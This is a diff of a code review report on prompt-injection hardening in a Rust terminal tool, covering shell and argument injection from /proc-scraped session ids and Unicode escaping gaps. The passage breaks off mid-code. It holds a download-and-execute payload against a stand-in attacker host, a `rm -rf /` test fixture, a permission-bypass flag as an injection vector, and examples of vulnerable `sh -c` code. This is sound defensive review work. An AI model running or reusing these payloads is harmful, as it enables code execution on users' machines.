@@ -2,20 +2,16 @@
 phase: 21-llm-goal-layer-prompt-injection-hardening
 reviewed: 2026-08-27T00:00:00Z
 depth: standard
-files_reviewed: 28
+range: 80bc4c1..HEAD
+files_reviewed: 20
 files_reviewed_list:
   - src/app.rs
-  - src/archive.rs
-  - src/browser.rs
-  - src/driver/mod.rs
   - src/error.rs
-  - src/executor/mod.rs
-  - src/main.rs
-  - src/registry.rs
-  - src/session_detector.rs
   - src/state_reader/backlog.rs
-  - src/state_reader/git_ops.rs
+  - src/test_support.rs
   - src/text.rs
+  - src/ui/mod.rs
+  - src/ui/roadmap_widget.rs
   - src/ui/screens/add_project.rs
   - src/ui/screens/create_project.rs
   - src/ui/screens/delete_confirm.rs
@@ -25,523 +21,558 @@ files_reviewed_list:
   - src/ui/screens/driver_inject.rs
   - src/ui/screens/driver_start.rs
   - src/ui/screens/enqueue.rs
-  - src/ui/screens/help.rs
   - src/ui/screens/mod.rs
   - src/ui/screens/normal.rs
   - src/ui/screens/queue_delete_confirm.rs
   - src/ui/screens/render_escape_guard.rs
-  - tests/journal_run_paths.rs
-  - tests/registry_test.rs
 findings:
-  critical: 3
-  warning: 8
-  info: 2
+  critical: 1
+  warning: 6
+  info: 6
   total: 13
 status: issues_found
 ---
 
-# Phase 21 (round 9): Code Review Report
+# Phase 21 (round 10): Code Review Report
 
 **Reviewed:** 2026-08-27
-**Depth:** standard
-**Files Reviewed:** 28
+**Depth:** standard (per-file, with targeted simulation of the three new censuses)
+**Range:** `80bc4c1..HEAD`
+**Files Reviewed:** 20
 **Status:** issues_found
 
 ## Summary
 
-Round 9's carrier mechanism is real and the parts of it I could falsify held up:
-`Untrusted` genuinely withholds `Display` / `AsRef<str>` / `Into<Cow<'static,str>>`
-(verified by reading the type and its runtime probe), its hand-written `Debug`
-routes through `shown()`, `Rendered` is the only escaped-and-ergonomic type, and
-`Screen: RenderAdjudicated` is a genuine compile-time obligation that a text scan
-cannot be short of. `cargo test --lib` is green and `cargo clippy --all-targets`
-produces only the four known pre-existing lints.
+The four round-10 claims were checked against the code rather than against their prose.
 
-The headline claim — **"an unescaped untrusted string is now *unrenderable*, not
-merely that known sites were patched"** — is nevertheless false, and it is false in
-the two directions the mechanism structurally cannot cover:
+**What is true.**
 
-1. **Values that never entered a carrier.** `DriverOutputLine::text`,
-   `ProjectViewCache::defaults_text_buffer` and the dry-run report are all plain
-   `String`s built from disk content. The compiler named nothing for them, and all
-   three reach a terminal cell carrying the invisible class — including
-   `U+E0000..U+E007F`, the tag block this phase itself names as "the LLM
-   ASCII-smuggling carrier". The live driver output pane, i.e. the pane that
-   displays the LLM's own prose in a phase titled *Prompt-Injection Hardening*, is
-   one of them.
-2. **A raw accessor whose call site was mis-classified.** `detail.rs`'s Sessions-tab
-   resume interpolates `sid.as_raw_for_logic_only()` into an `sh -c` string under a
-   new comment calling it "A SUBPROCESS ARGUMENT". It is not an argv element; it is
-   a shell command fragment, and the value comes from another process's `/proc`
-   entry. That is command injection, introduced-in-comment and blessed by this
-   round's diff.
+- **21-27 (CR-01) — the interpreter is genuinely gone.** `sh -c` no longer appears in
+  either Sessions-tab spawn path. `src/ui/screens/detail.rs:1817-1818` and `:2223-2224`
+  both build an argv vector and pass the working directory through
+  `Command::current_dir`. A tree-wide grep for `Command::new` / `"-c"` finds no other
+  shell-interpolation site introduced by this round; the only remaining `sh -c` is
+  `project_creator::execute_hook` (`src/project_creator.rs:69-71`), which runs an
+  operator-authored `hooks.post_create` from the user's own `config.json` and is
+  correctly named as an out-of-scope case in the census doc.
+- I independently ran the 21-27 census's algorithm against the pre-fix
+  `src/ui/screens/detail.rs` (extracted from `80bc4c1`). It reports both original sites
+  (`:1693` and `:2097`). The "it would have caught CR-01" claim is real, not asserted.
+- **21-28 (CR-02)** is type-held as advertised. `DriverOutputLine::text` is
+  `crate::text::Untrusted` (`src/ui/screens/mod.rs:475`), `push_record` is the single
+  construction site (`src/ui/screens/mod.rs:566-583`), and `driver.rs`'s pane renders it through `.shown()`.
+- **21-29's backlog fix** is a correct total order: `f64::total_cmp` over a key that
+  filters non-finite values, with antisymmetry and transitivity swept in tests.
+- **`WAVE_PENDING` is `[(&str, &str); 0]`** (`src/ui/mod.rs:121`) — empty, as required.
+- `cargo test --lib` is 1103/0 green; `cargo clippy --all-targets -- -D warnings`
+  reports only the four known pre-existing lints (`browser.rs:155-157`,
+  `project_creator.rs:146`). Both run through `rtk proxy`.
 
-Beyond that, three doc-level claims in the new mechanism have no committed control
-that can go red for them — which is this phase's own named recurring defect,
-recurring at the level the mechanism itself introduced.
+**What is not.** One live injection residual survives the CR-01 fix in the exact
+function that claims to close it, and three of this round's four new guard mechanisms
+have measured blind spots that are wider than the residuals their docs disclose. Each
+blind spot below was reproduced by running the guard's own algorithm against a fixture,
+not inferred from reading.
 
-Cross-cutting note used in the analysis below: ratatui 0.30's `Span::styled_graphemes`
-and `Buffer::set_stringn` both filter `!symbol.contains(char::is_control)`, so the C0/DEL/C1
-*control* class cannot reach a cell through any widget family. That is what keeps
-several of the half-escaped TUI sites at WARNING rather than BLOCKER. It does **not**
-apply to stdout/stderr, and it does **not** apply to the invisible-formatting class.
+---
 
 ## Critical Issues
 
-### CR-01: Shell command injection from `/proc`-scraped session id and cwd
+### CR-01: `resume_terminal_argv` turns shell injection into argument injection — a hyphen-leading session id is an unintended option, and the control's fixture set contains none
 
-**File:** `src/ui/screens/detail.rs:1692-1707`
+**File:** `src/ui/screens/detail.rs:619-632` (the argv), `:1817` (the spawn),
+`src/session_detector.rs:96-113` (the source), `:7270-7293` (the control's fixture set)
+
 **Issue:**
-The Sessions tab's resume action builds a shell command string and hands it to `sh -c`:
+
+`resume_terminal_argv` builds:
 
 ```rust
-.args([
-    "-e", "sh", "-c",
-    &format!(
-        "cd '{}' && claude --resume '{}'",
-        session.working_dir.display(),
-        sid.as_raw_for_logic_only()
-    ),
-])
+vec![
+    terminal_program_separator(term).to_string(),  // "-e" or "--"
+    "claude".to_string(),
+    "--resume".to_string(),
+    sid.as_raw_for_logic_only().to_string(),       // untrusted, unvalidated
+]
 ```
 
-Both interpolated values are attacker-influenced in the strongest sense this codebase
-recognises. `session_id` is read verbatim out of another process's `/proc/<pid>/cmdline`
-`--resume` argument (`src/session_detector.rs:96-113`), and `working_dir` is
-`read_link("/proc/<pid>/cwd")` (`src/session_detector.rs:63`). Neither is validated, and
-neither goes through `is_identity_char`. A single `'` in either terminates the quoting; a
-session id of
+`sid` is scraped verbatim from another process's `/proc/<pid>/cmdline`
+(`session_detector::read_session_id`, `src/session_detector.rs:96-113`). Nothing
+validates its shape: the only filter is `!val.is_empty()` after a `trim()`. It may
+therefore begin with `-`.
 
-```
-x' ; curl http://attacker/p | sh ; echo '
-```
+Deleting the interpreter removed the *shell* metacharacter class. It did not remove the
+*option* metacharacter class, and there are still two option parsers in the path:
 
-executes arbitrary code in a terminal the operator opened, with the operator's privileges.
-An unprivileged local process — or a `claude` invocation whose `--resume` argument came
-from a repository the user cloned — is sufficient to plant it.
+1. the terminal emulator, and
+2. `claude` itself, whose `--resume [sessionId]` takes an **optional** value — so a
+   following `-`-leading token is parsed as a new option of `claude` rather than as
+   `--resume`'s argument.
 
-This round *touched these exact lines*: it changed `sid` to `sid.as_raw_for_logic_only()`
-and added the comment "A SUBPROCESS ARGUMENT: the raw id is what `claude --resume` must
-receive". The classification is wrong — the value is not passed as an argv element to
-`claude`, it is spliced into a shell program — so the round has recorded a security
-rationale that does not describe the code.
+A planted session id of `--dangerously-skip-permissions` (or any other `claude` flag)
+therefore becomes an option the operator did not type, in a working directory
+(`current_dir(&session.working_dir)`) the operator also did not choose. This is CWE-88
+(argument injection), the standard successor defect to CWE-78 when a fix converts a
+shell string into an argv without adding an end-of-options marker.
 
-`shorten_session_id`'s multibyte fix landed correctly beside this and is not affected.
+The function's own doc asserts the opposite, in terms that are now too strong:
 
-**Fix:** Do not build a shell string at all. Pass argv directly and set the working
-directory through the API:
+> *"**The third kind no longer exists here** because there is no interpreter left in
+> the path to parse anything — that is why a quote, a semicolon, a backtick, a
+> dollar-parenthesis or a newline in the session id is now data."*
 
-```rust
-match std::process::Command::new(&term)
-    .args(["-e", "claude", "--resume", sid.as_raw_for_logic_only()])
-    .current_dir(&session.working_dir)
-    .spawn()
-```
+Every character in that list is now data. `-` is not, and it is the one that still
+matters. The list is the same list as the fixture set in
+`hostile_session_ids()` (`src/ui/screens/detail.rs:7270-7293`): `a'b`, `a"b`, `a;b`,
+`a&&b`, `a|b`, backticks, `$( )`, newline, `\u{7}`, a bare space, and
+`'; rm -rf / #`. **Not one fixture begins with a hyphen**, so
+`the_resume_argv_carries_a_hostile_session_id_as_one_opaque_element` passes today and
+would pass unchanged against a build that shipped this defect. Per this phase's own
+standard, a control whose fixture set omits the live case is not a certificate for it.
 
-If a terminal emulator that only accepts a single `-e` string must be supported, shell-quote
-both values (escape `'` as `'\''`) in one helper and put a control on it; do not interpolate
-raw. Correct the comment: it is a *shell command fragment*, which is a third question beside
-"read by a human" and "used as a lookup", and the carrier's two-accessor vocabulary does not
-currently name it.
-
----
-
-### CR-02: The live driver output pane, injection rows and dry-run preview escape only the CONTROL class — the tag block reaches a cell
-
-**File:** `src/ui/screens/driver.rs:1088`, `src/ui/screens/driver.rs:1684`,
-`src/ui/screens/driver.rs:1732` (via `src/ui/screens/mod.rs:425-437, 527-540`)
-**Issue:**
-`shown_capped` (`driver.rs:614`) was introduced this round precisely because
-"`sanitize_render_line` alone … answers only the CONTROL class … so `U+202E`, `U+00AD` and
-the `U+E0000..U+E007F` tag block passed through untouched into a `Paragraph`". It was applied
-to six sites. Three sites on the same path were left behind:
-
-* **The live output pane.** `DriverOutput::push_record` (`mod.rs:425`) sanitises with
-  `sanitize_render_line` at append time (control class only) and stores the result in
-  `DriverOutputLine::text`. `output_line` (`driver.rs:1732`) renders that string with
-  `Span::styled(line.text.clone(), …)` into a `Paragraph` (`driver.rs:1964`). The text is
-  `exec_event`'s `text` field — the agent's own prose, read back off disk by
-  `crate::app::driver_line_for_record` (`src/app.rs:163-173`). Nothing between disk and cell
-  applies `display_identity`.
-* **Injection rows.** `driver.rs:1684` renders `sanitize_render_line(&message.text)`, where
-  `message` is an `InboxMessage` read from `inbox.jsonl` on disk.
-* **The dry-run preview.** `driver.rs:1088` renders `sanitize_render_line(raw)` over the
-  report body, which the function's own doc says "interpolates paths and branch names read
-  from the project".
-
-By this tree's own measured widget table (quoted in
-`render_escape_guard::tests::the_screen_renders_identity_escaped`'s doc) `U+E0041` **SURVIVES**
-through `Paragraph`, and the tree's own RED for the Browse tab file view
-(`['\u{e0041}']` in a `Paragraph`-rendered markdown body) is direct in-repo evidence of the
-same route. So the invisible class arrives in the pane that shows LLM output — the exact
-carrier and the exact surface this phase is named for.
-
-This is not covered by any control: `probe_ctx` populates `cache.driver_runs` but leaves
-`ctx.driver_output`, `cache.driver_journal` and `cache.driver_inbox` empty, so the Driver tab
-renders `no_runs_lines`/`NO_JOURNAL_ENTRIES` under probe. `DETAIL_TAB_ARRIVAL`'s "Driver tab"
-row records only the run-list row and run header. `render_escape_guard`'s LIMIT 1 names
-`driver_dry_run` as a remaining unprobed state but does not name the output pane, the journal
-or the inbox — so the module's own residual disclosure is short by the tab's largest render
-surface.
-
-Additionally, `sanitize_render_line`'s doc in `mod.rs:515-519` asserts as justification that
-"`driver.rs` and `driver_confirm.rs` compose `display_identity(&sanitize_render_line(..))`".
-That sentence is false for these three sites, which is what let the gap survive.
-
-**Fix:** Compose both classes on this path. Either escape at append time —
-
-```rust
-// src/ui/screens/mod.rs, sanitize_record_lines
-lines.push(crate::text::display_identity(&sanitize_render_line(segment)));
-```
-
-— or, preferably, at the three render sites so the buffered value keeps a single documented
-meaning:
-
-```rust
-// driver.rs:1732
-Span::styled(shown_capped(&line.text), text_style),
-// driver.rs:1684
-shown_capped(&message.text)
-// driver.rs:1088
-.map(|raw| Line::from(shown_capped(raw)))
-```
-
-Then close the probe gap that hid it: populate `ctx.driver_output` /
-`cache.driver_journal` / `cache.driver_inbox` in `probe_ctx` and add
-`driver_dry_run` as a `DETAIL_SUB_STATES` entry, so assertion 3 fires on these paths.
-Correct `sanitize_render_line`'s doc claim in the same commit.
-
----
-
-### CR-03: The Defaults tab's string-edit popup renders a raw `.planning/config.json` value
-
-**File:** `src/ui/screens/detail.rs:4145-4155` (value copied at `src/ui/screens/detail.rs:1883-1888`)
-**Issue:**
-The same value is escaped in one render and raw in the other, three thousand lines apart:
-
-* `detail.rs:4088` — `let val_span = Span::styled(shown(&entry.value), val_style);` (escaped
-  this round, with a comment explaining that `entry.value` is free-form text from the
-  project's `.planning/config.json`).
-* `detail.rs:1887` — `cache.defaults_text_buffer = entry.value.clone();` — the *same*
-  `entry.value`, copied raw into a plain `String` field.
-* `detail.rs:4146` — `Span::styled(buffer.clone(), Style::default().fg(Color::White))`
-  inside a `Clear`ed `Paragraph` popup. No escape.
-
-So pressing Enter on a string-valued Defaults row re-renders the value unescaped. Through a
-`Paragraph` the tag block survives (same measurement as CR-02), and the popup is an editing
-surface — the operator is deciding what to write back to disk while reading a string that is
-not what it appears to be.
-
-`render_escape_guard`'s LIMIT 1 names this state as one no probe fixture reaches, but it
-frames it purely as a *coverage* gap ("draws `defaults_text_buffer` and `entry.key` into a
-`Clear`ed popup through a code path no probe state reaches"). It is also a *correctness*
-gap: the site is unescaped, not merely unprobed, and the disclosure does not say so.
-
-This is the concrete falsification of the round's headline claim. The carrier could not name
-this site because `GsdConfig`'s fields and `defaults_text_buffer` are bare `String`s, which
-is exactly the class of value the round left untyped.
+Exploitability caveat, stated so the rating is not read as wider than it is: the
+attacker must be able to run a process named `claude` *as the same user* — a
+different user's `/proc/<pid>/cwd` readlink fails and `build_session` drops the row
+(`src/session_detector.rs:63`). No privilege boundary is crossed. It is rated Critical
+because it is a live injection path inside the function this plan created to close
+injection, because the plan's doc makes a completeness claim that is false of it, and
+because the fix is one array element.
 
 **Fix:**
 
 ```rust
-let text = Paragraph::new(Line::from(vec![
-    Span::styled(shown(buffer), Style::default().fg(Color::White)),
-    Span::styled("\u{2588}", Style::default().fg(Color::Cyan)),
-]))
+fn resume_terminal_argv(term: &str, sid: &Untrusted) -> Vec<String> {
+    vec![
+        terminal_program_separator(term).to_string(),
+        "claude".to_string(),
+        "--resume".to_string(),
+        // END-OF-OPTIONS. Deleting the interpreter removed the shell's
+        // metacharacters; `-` is the option parser's, and `claude --resume`
+        // takes an OPTIONAL value, so a hyphen-leading id is read as a new
+        // flag rather than as this option's argument.
+        "--".to_string(),
+        sid.as_raw_for_logic_only().to_string(),
+    ]
+}
 ```
 
-and add a `DETAIL_SUB_STATES` entry that sets `defaults_editing = Some(idx)` on a
-`ConfigValueKind::String` row, so the state is probed. Note `entry.key` in the popup title is
-a `&'static str` from `build_defaults_entries` and needs nothing.
+(Confirm `claude` honours `--` before the positional; if it does not, the alternative is
+to refuse at the source — `read_session_id` returns `None` unless the value matches the
+UUID shape `claude --resume` actually accepts — and to report the refusal rather than
+silently dropping it.)
+
+Then extend the control in both directions:
+
+```rust
+// in hostile_session_ids()
+"-h",
+"--dangerously-skip-permissions",
+"--print",
+"-",
+```
+
+plus an assertion that the untrusted element is preceded by `"--"` in the argv, so the
+absence of the separator goes red rather than the presence of a quote.
+
+---
 
 ## Warnings
 
-### WR-01: `Untrusted`'s absent-trait claim names six traits; the control checks three
+### WR-01: `every_render_site_under_ui_composes_both_classes` is exercised by 6 lines in 2 of the 16 files it walks; its name claims a property it does not check
 
-**File:** `src/text.rs:512-530`, `src/text.rs:1729-1791`
-**Issue:** The type doc claims, as the mechanism's foundation:
+**File:** `src/ui/mod.rs:196-231` (the census), `:357-408` (the assertion)
 
-> * **no `AsRef<str>`, no `Deref`, no `Borrow<str>`, no `Into<Cow<'_, str>>`** — so it cannot
->   be coerced into one either,
-> * **no `serde` traits** …
->
-> Those five absences are certified by
-> `tests::an_untrusted_carrier_implements_none_of_the_string_conversions` …
-
-`an_untrusted_carrier_implements_none_of_the_string_conversions` asserts exactly three
-absences — `Display`, `AsRef<str>`, `Into<Cow<'static, str>>`. There is no probe for `Deref`,
-`Borrow<str>`, `Serialize` or `Deserialize`. Adding `impl Deref<Target = str> for Untrusted`
-tomorrow restores the raw path at every site in the tree through auto-deref, and every test
-in this repository stays green while the doc keeps claiming the absence.
-
-This is the exact failure shape the test's own doc rails against ("A comment cannot go red.
-Add `impl Display` tomorrow and the doc keeps claiming the absence while the tree no longer
-has it — which is this phase's defining failure shape"), one level up. `Deref` is the most
-dangerous of the unchecked three, because it is the only one that silently rewrites every
-existing call site.
-
-**Fix:** Extend `trait_probe` with `DerefYes/No` (bounded `T: std::ops::Deref<Target = str>`),
-`BorrowStrYes/No` (`T: std::borrow::Borrow<str>`) and `SerializeYes/No`
-(`T: serde::Serialize`), assert the three further absences for `Untrusted`, and keep the
-`String` control arm for each so a broken probe cannot pass. Observe each red by planting.
-
----
-
-### WR-02: The `sealed` doc claims an in-crate hand-written adjudication is impossible; it is not
-
-**File:** `src/ui/screens/mod.rs:46-67`, `src/ui/screens/mod.rs:154-176`
-**Issue:** The seal is declared
-
-```rust
-pub(crate) mod sealed {
-    pub trait Sealed {}
-}
-```
-
-and documented as: *"Inside the crate the only route is `adjudicate_screen`, which is what
-keeps the disposition vocabulary to the two constants below"*, and the macro's own doc says
-*"so a screen inside this crate cannot hand-write an adjudication that skips the two-constant
-vocabulary"*.
-
-Both sentences are false as written. `sealed::Sealed` is `pub(crate)` and `RenderAdjudicated`
-is `pub` with `pub` methods, so any module in this crate can write
-
-```rust
-impl crate::ui::screens::sealed::Sealed for MyScreen {}
-impl crate::ui::screens::RenderAdjudicated for MyScreen {
-    fn disposition(&self) -> &'static str { "whatever" }
-    fn adjudication_reason(&self) -> &'static str { "" }
-}
-```
-
-and never invoke the macro. The genuine guarantee — the one worth having — is that
-*adjudication is mandatory* (E0277) and that *downstream crates* cannot implement it. Both
-hold. The vocabulary restriction does not, and no committed control goes red for it: a third
-disposition value only `panic!`s inside `the_screen_renders_identity_escaped`, which requires
-the screen to have a fixture row.
-
-**Fix:** Either narrow the doc to what is true (mandatory adjudication + downstream sealing;
-in-crate vocabulary is convention enforced by the probe, not by the type), or make the claim
-real by moving the two disposition constants into a `pub(crate)` enum that
-`RenderAdjudicated::disposition` returns, so a third value is not expressible.
-
----
-
-### WR-03: `RenderAdjudicated::adjudication_reason` has zero readers
-
-**File:** `src/ui/screens/mod.rs:148-152`
-**Issue:** `grep -rn adjudication_reason src/ tests/` finds one production definition, eleven
-macro expansions and one doc mention — and no call site anywhere. The method is promoted as
-"what a future reader inherits", but nothing renders it, nothing asserts it is non-empty, and
-nothing asserts it does not say "escaped"/"safe" (which its own doc forbids). Dead weight
-that carries a claim.
-
-The predecessor (the `reason` column in `SCREEN_IDENTITY_DISPOSITIONS`) had the same problem,
-so this is a carried-forward defect rather than a new one — but it is now a trait method, and
-a trait method with no consumers is dead code by any reading.
-
-**Fix:** Either consume it in `the_screen_renders_identity_escaped`'s failure messages (so a
-red names *what the screen claims to draw* beside what it drew), or add a cheap control:
-assert every adjudicated screen's reason is non-empty and contains neither `"escaped"` nor
-`"safe"`. Both are a few lines and both make the claim checkable.
-
----
-
-### WR-04: `src/main.rs`'s `list` arm carries a comment that is now factually wrong, plus its dead workaround
-
-**File:** `src/main.rs:238-252`
-**Issue:** The comment block states:
-
-> **`.to_string()` is load-bearing here and is not cosmetic.** `Rendered`'s `Display` is
-> `f.write_str(&self.0)`, which IGNORES the formatter's width and fill … The correct fix is
-> `f.pad(&self.0)` in `impl Display for Rendered`, but `src/text.rs` belongs to plan `21-23`
-> and is off-limits to this plan's diff, so it is reported as a wave-conflict finding and
-> worked around at this one call site instead.
-
-Commit `7bf8f6b` did apply `f.pad` (`src/text.rs:437-439`), and
-`rendered_display_honours_the_format_spec_in_both_directions` pins it. The comment is stale in
-the direction that matters: a reader who trusts it will avoid `{:<N}` on `Rendered`
-everywhere, which is the opposite of the design. The `.to_string()` is now dead.
-
-**Fix:** Delete the workaround and the paragraph:
-
-```rust
-println!(
-    "{:<20} {:<50} {}",
-    gsd_meta_manager::text::render_for_terminal(alias),
-    project.path.display(),
-    project.added
-);
-```
-
-and replace the paragraph with a one-line note that `Rendered`'s `Display` pads, pinned by the
-named test.
-
----
-
-### WR-05: `render_for_terminal` is declared "the ONE composition", but six render sites still call `display_identity` alone
-
-**File:** `src/ui/screens/normal.rs:697,709,749,763,779,1003`,
-`src/ui/screens/add_project.rs:243,256`, `src/ui/screens/create_project.rs:265,275`,
-`src/ui/screens/driver_start.rs:340,356`, `src/ui/screens/driver_inject.rs:197`,
-`src/ui/screens/enqueue.rs:124`
-**Issue:** `detail.rs`'s `shown()` was moved to `render_for_terminal` this round with an
-explicit argument (`detail.rs:50-69`): *"a `.planning/` file can carry a raw `ESC`, a C0
-control, or a C1 introducer just as easily as a `U+202E` … this file no longer decides which
-halves apply — it inherits the resolution."* `main.rs`'s CLI echoes and
-`LegacyRegistryKey::escaped_for_display` were moved for the same stated reason (WR-01).
-
-`normal.rs` draws the *same* `ProjectState` fields — status, milestone, phase name, workstream
-name — and the *same* registry key `main.rs`'s `list` arm draws, and it still calls
-`display_identity` alone. So does every `ctx.input_buffer` / `ctx.error_message` echo. The
-"one composition, no consumer re-decides" claim is not true of the tree.
-
-Impact is currently bounded, not zero: ratatui 0.30 filters `char::is_control` graphemes in
-both `Span::styled_graphemes` (`ratatui-core-0.1.2/src/text/span.rs:314`) and
-`Buffer::set_stringn` (`buffer.rs:351`), so the control class cannot reach a cell today. That
-mitigation is a property of the dependency, is not asserted anywhere in this tree, and does
-not travel — `ctx.error_message` and `ctx.status_message` strings are also produced by
-non-TUI paths.
-
-**Fix:** Replace `crate::text::display_identity(..)` with
-`crate::text::render_for_terminal(..)` at the listed sites (all are `Into<Cow>` sinks, so the
-`Rendered` value goes straight in), and add a lightweight source census — the shape
-`text::tests::exactly_one_executable_spelling_of_the_identity_alphabet_exists_under_src`
-already establishes — asserting that `display_identity` has no executable call site under
-`src/ui/` outside `render_for_terminal`'s own composition.
-
----
-
-### WR-06: The opt-in disclosure escapes only the control class
-
-**File:** `src/ui/screens/driver_confirm.rs:162-167`
-**Issue:** `render_disclosure` renders `input.path` and `digest` through
-`super::sanitize_render_line(..)` — control class only. Both are read out of the recorded
-`driver_opt_in` block in the user's `config.json`, which is a file on disk that this build
-does not exclusively own. The screen's own adjudication reason acknowledges the split
-("already `sanitize_render_line`d for C0/ESC, which is a different class from the invisible
-one") without closing it.
-
-The probe covers the two opt-in prompts, but only with the shipped
-`DISCLOSED_PROMPT_INPUTS` defaults, all of which are authored `&'static str` — so no committed
-control can go red here.
-
-**Fix:** Compose both classes, matching the two sites 100 lines below in the same file:
-
-```rust
-crate::text::display_identity(&super::sanitize_render_line(&input.path)),
-profile,
-crate::text::display_identity(&super::sanitize_render_line(digest)),
-```
-
-and give the fixture a `PromptInput` whose `path`/`digest` carry the probe identity so the
-site is exercised.
-
----
-
-### WR-07: `parse_backlog_items`' sort comparator is not a total order on attacker-named directories
-
-**File:** `src/state_reader/backlog.rs:88-106`
 **Issue:**
 
-```rust
-let a_num: f64 = a.number.as_raw_for_logic_only()
-    .strip_prefix("999.").and_then(|s| s.parse().ok()).unwrap_or(0.0);
-…
-a_num.partial_cmp(&b_num).unwrap_or(std::cmp::Ordering::Equal)
+The test is named for render sites and its failure message says *"executable call sites
+under src/ui/ apply the invisible-formatting half alone"*. Its implementation only ever
+inspects lines that contain the literal `display_identity(`. A render site that escapes
+**nothing at all** — `Span::raw(untrusted_string)` — carries no needle and is invisible
+to it.
+
+Measured at HEAD, `display_identity(` occurrences per file under `src/ui/`:
+
+```
+0  roadmap_widget.rs      0  normal.rs             0  add_project.rs
+0  driver_inject.rs       0  enqueue.rs            0  driver_start.rs
+0  delete_confirm.rs      0  queue_delete_confirm  0  help.rs
+0  create_project.rs      0  ui/mod.rs             1  detail.rs   (doc comment only)
+3  screens/mod.rs (all doc comments)               1  render_escape_guard.rs (exempt)
+3  driver.rs (2 executable + 1 doc)                4  driver_confirm.rs (4 executable)
 ```
 
-`"NaN".parse::<f64>()` succeeds. A directory named `999.NaN-x` under
-`.planning/phases/` therefore yields `a_num == f64::NAN`, `partial_cmp` returns `None`, and
-the comparator answers `Equal` against every other element — which breaks transitivity of
-equality. Rust's current `slice::sort_by` detects total-order violations and panics with
-*"user-provided comparison function does not correctly implement a total order"*. A panic
-inside `parse_backlog_items` is reached from the Backlog tab's load path.
+So the assertion is driven by **six executable lines in two files**. Fourteen files —
+including the two largest render surfaces, `detail.rs` (7 462 lines) and `normal.rs` —
+contribute nothing, and a new un-escaped `Span::raw` in any of them is not a census hit,
+not a compile error, and caught only if a `render_escape_guard` probe state happens to
+reach it.
 
-Directory names in `.planning/` are exactly this phase's declared trust boundary (SAFE-07), so
-"nobody would name a directory that" is not an argument available here. `999.inf-x` and
-`999.-1-x` are milder variants of the same missing validation.
+This is a control whose coverage **shrinks as the conversion succeeds**: every site
+converted from `display_identity` to `render_for_terminal` removes a line the census can
+see. The `!files.is_empty()` guard at `:360` only proves the walk found files; there is
+no per-file or global non-vacuity guard on the needle (contrast `driver.rs:2252-2268`,
+which at least attempts one).
 
-**Fix:** Sort on a total order:
+The residuals block at `:346-356` lists two gaps (alias/re-export; join > 4 lines). It
+does not list this one, which is the largest.
 
-```rust
-items.sort_by(|a, b| {
-    let key = |item: &BacklogItem| {
-        item.number.as_raw_for_logic_only()
-            .strip_prefix("999.")
-            .and_then(|s| s.parse::<f64>().ok())
-            .filter(|n| n.is_finite())
-            .unwrap_or(0.0)
-    };
-    key(a).total_cmp(&key(b))
-});
-```
+**Fix:** either (a) rename and re-scope the claim to what is checked —
+*`no_display_identity_call_under_ui_stands_outside_a_composition`* — and state in the
+residuals that the census says nothing about a site that escapes nothing; or (b) add the
+missing half: a non-vacuity guard asserting the needle appears in at least *N* files, and
+route the "escapes nothing" question to a second control (widening the
+`render_escape_guard` probe states is the only mechanism in the tree that can answer it).
+Option (a) is honest and cheap; option (b) is the one that makes the test's current name
+true.
 
-`f64::total_cmp` is a total order by construction and needs no `unwrap_or`.
+### WR-02: the interpreter census's line-join budget is consumed by comment lines — 12 comments between the interpreter and the interpolation defeat it, and the disclosed residual points at a paragraph that was never written
 
----
+**File:** `src/text.rs:1724-1760` (`interpreter_program_sites`),
+`:1713-1722` (`has_an_unclosed_delimiter`), `:1785-1815` (the residual block)
 
-### WR-08: `the_debug_route_of_every_alias_carrying_variant_uses_this_projects_own_notation` only works because every fixture has exactly one invisible character
-
-**File:** `src/error.rs:1237-1256`
-**Issue:** The expected escape is built by concatenating the escaped form of *every*
-invisible-class character in the hostile value, with no separator, and then asserting
-`debug.contains(&expected)`:
+**Issue (a) — comment lines burn the join budget.** In the join loop
+(`src/text.rs:1739-1755`), `taken` is incremented *before* the comment check:
 
 ```rust
-let expected: String = hostile.chars()
-    .filter(|c| is_invisible_formatting_char(*c))
-    .map(|c| format!("U+{:04X}", c as u32))
-    .collect();
-assert!(debug.contains(&expected), …);
-```
-
-Every member of `LOOK_ALIKE_PAIRS` (`src/test_support.rs:100-107`) happens to carry exactly
-one invisible character, so `expected` is a single marker and the assertion holds. Add a
-fixture like `("demo", "de\u{200b}mo\u{feff}")` — a shape the phase's own arguments make
-likely — and `expected` becomes `"U+200BU+FEFF"`, which never appears in
-`"deU+200BmoU+FEFF"`. The test goes red for a *correct* implementation.
-
-This is a latent trap on a control the phase relies on, in a fixture list this phase keeps
-extending.
-
-**Fix:** Assert per character rather than over a concatenation:
-
-```rust
-for c in hostile.chars().filter(|c| is_invisible_formatting_char(*c)) {
-    let marker = format!("U+{:04X}", c as u32);
-    assert!(debug.contains(&marker), "…");
+ahead += 1;
+taken += 1;
+let next = lines[ahead].1.trim();
+if next.starts_with("//") {
+    continue;                       // line skipped, budget still spent
 }
 ```
 
-keeping the existing non-vacuity assertion that at least one such character exists.
+I ran the census's algorithm against synthetic fixtures of exactly the CR-01 shape
+(`Command::new(&term).args([ "-e", "sh", "-c", <N comment lines>, &format!(...) ])`):
+
+| comment lines between `"-c"` and `&format!` | reported |
+|---|---|
+| 4  | yes |
+| 10 | yes |
+| 11 | yes |
+| **12** | **no** |
+| 13 | no |
+
+The real CR-01 site had five. This codebase's comment blocks routinely run ten to twenty
+lines — the round-10 diff itself contains dozens of comment blocks longer than twelve
+lines inside expression bodies. The budget is not comfortable; it is one ordinary
+comment block away from silent.
+
+**Issue (b) — a residual is cross-referenced but not present.**
+`has_an_unclosed_delimiter`'s doc (`src/text.rs:1706-1712`) says: *"Deliberately NOT a
+method-chain follower … **The price is stated as a residual on the census itself.**"*
+The census's residual block (`src/text.rs:1785-1815`) states three residuals — a
+construction assembled across *statements*, an interpreter named by a variable, and
+`project_creator::execute_hook`. The method-chain price is not among them.
+
+That price is real and it is the most idiomatic spelling of the defect. Measured against
+the census's own algorithm, all of these are missed:
+
+```rust
+// missed — method chain, interpreter and interpolation on different lines
+Command::new("bash")
+    .arg("-c")
+    .arg(format!("echo {}", x));
+
+// missed — assembled into a local first
+let prog = format!("echo {}", x);
+Command::new("sh").args(["-c", &prog]);
+
+// missed — .concat() is not in the marker list
+Command::new("sh").args(["-c", &["echo ", x].concat()]);
+
+// missed — `+` without `&`
+Command::new("sh").args(["-c", &("echo ".to_string() + x)]);
+```
+
+Only the single-physical-line form is reported. This phase's own standing rule is that a
+claim certified only by prose is a finding; a residual that a doc *points at* and that
+does not exist is the same failure one level down.
+
+**Fix:** move the `taken += 1` after the comment check so skipped lines do not consume
+the budget:
+
+```rust
+ahead += 1;
